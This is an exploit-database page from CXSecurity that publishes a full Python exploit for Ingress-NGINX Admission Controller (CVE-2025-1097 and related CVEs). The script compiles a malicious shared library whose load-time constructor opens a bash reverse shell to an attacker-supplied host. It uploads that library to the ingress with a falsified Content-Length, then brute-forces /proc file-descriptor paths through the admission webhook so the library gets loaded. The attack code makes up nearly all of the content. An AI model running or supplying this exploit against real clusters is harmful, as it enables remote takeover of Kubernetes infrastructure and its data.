---
title: Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE
url: https://cxsecurity.com/issue/WLB-2026020008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-05
fetch_date: 2026-02-06T04:08:34.791693
---

# Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE**  **2026.02.05**  Credit:  **[Beatriz Fresno Naumova](https://cxsecurity.com/author/Beatriz%2BFresno%2BNaumova/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-1097](https://cxsecurity.com/cveshow/CVE-2025-1097/ "Click to see CVE-2025-1097")**  CWE: **N/A** | |

# Exploit Title: Ingress-NGINX Admission Controller v1.11.1 - FD Injection to RCE
# Date: 2025-10-07
# Exploit Author: Beatriz Fresno Naumova
# Vendor Homepage: https://kubernetes.io
# Software Link: https://github.com/kubernetes/ingress-nginx
# Version: Affects v1.10.0 to v1.11.1 (potentially others)
# Tested on: Ubuntu 22.04, RKE2 Kubernetes Cluster
# CVE: CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-1974
import os
import sys
import socket
import requests
import threading
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
# --- Embedded malicious shared object template ---
MALICIOUS\_C\_TEMPLATE = """
#include <stdlib.h>
\_\_attribute\_\_((constructor))
void run\_on\_load() {
system("bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'");
}
int bind(void \*e, const char \*id) {
return 1;
}
void ENGINE\_load\_evil() {}
int bind\_engine() {
return 1;
}
"""
def compile\_shared\_library(host, port, output\_file="evil\_engine.so"):
c\_code = MALICIOUS\_C\_TEMPLATE.replace("HOST", host).replace("PORT", str(port))
with open("evil\_engine.c", "w") as f:
f.write(c\_code)
print("[\*] Compiling malicious shared object...")
result = os.system("gcc -fPIC -Wall -shared -o evil\_engine.so evil\_engine.c -lcrypto")
if result == 0:
print("[+] Shared object compiled successfully.")
return True
else:
print("[!] Compilation failed. Is gcc installed?")
return False
def send\_brute\_request(admission\_url, json\_template, proc, fd):
print(f"[\*] Trying /proc/{proc}/fd/{fd}")
path = f"proc/{proc}/fd/{fd}"
payload = json\_template.replace("REPLACE", path)
headers = {"Content-Type": "application/json"}
url = admission\_url.rstrip("/") + "/admission"
try:
response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5)
print(f"[+] Response for /proc/{proc}/fd/{fd}: {response.status\_code}")
except Exception as e:
print(f"[!] Error on /proc/{proc}/fd/{fd}: {e}")
def brute\_force\_admission(admission\_url, json\_file="review.json", max\_proc=50, max\_fd=30, max\_workers=5):
try:
with open(json\_file, "r") as f:
json\_data = f.read()
except FileNotFoundError:
print(f"[!] Error: {json\_file} not found.")
return
print("[\*] Starting brute-force against the admission webhook...")
with ThreadPoolExecutor(max\_workers=max\_workers) as executor:
for proc in range(1, max\_proc):
for fd in range(3, max\_fd):
executor.submit(send\_brute\_request, admission\_url, json\_data, proc, fd)
def upload\_shared\_library(ingress\_url, shared\_object="evil\_engine.so"):
try:
with open(shared\_object, "rb") as f:
evil\_payload = f.read()
except FileNotFoundError:
print(f"[!] Error: {shared\_object} not found.")
return
parsed = urlparse(ingress\_url)
host = parsed.hostname
port = parsed.port or 80
path = parsed.path or "/"
try:
sock = socket.create\_connection((host, port))
except Exception as e:
print(f"[!] Failed to connect to {host}:{port}: {e}")
return
fake\_length = len(evil\_payload) + 10
headers = (
f"POST {path} HTTP/1.1\r\n"
f"Host: {host}\r\n"
f"User-Agent: qmx-ingress-exploiter\r\n"
f"Content-Type: application/octet-stream\r\n"
f"Content-Length: {fake\_length}\r\n"
f"Connection: keep-alive\r\n\r\n"
).encode("iso-8859-1")
print("[\*] Uploading malicious shared object to ingress...")
sock.sendall(headers + evil\_payload)
response = b""
while True:
chunk = sock.recv(4096)
if not chunk:
break
response += chunk
print("[\*] Server response:\n")
print(response.decode(errors="ignore"))
sock.close()
def main():
if len(sys.argv) != 4:
print("Usage: python3 exploit.py <ingress\_url> <admission\_webhook\_url> <rev\_host:port>")
sys.exit(1)
ingress\_url = sys.argv[1]
admission\_url = sys.argv[2]
rev\_host\_port = sys.argv[3]
if ':' not in rev\_host\_port:
print("[!] Invalid format for rev\_host:port.")
sys.exit(1)
host, port = rev\_host\_port.split(":")
if not compile\_shared\_library(host, port):
sys.exit(1)
# Send the malicious shared object and keep the connection open
upload\_thread = threading.Thread(target=upload\_shared\_library, args=(ingress\_url,))
upload\_thread.start()
# Simultaneously brute-force the admission webhook for valid file descriptors
brute\_force\_admission(admission\_url)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top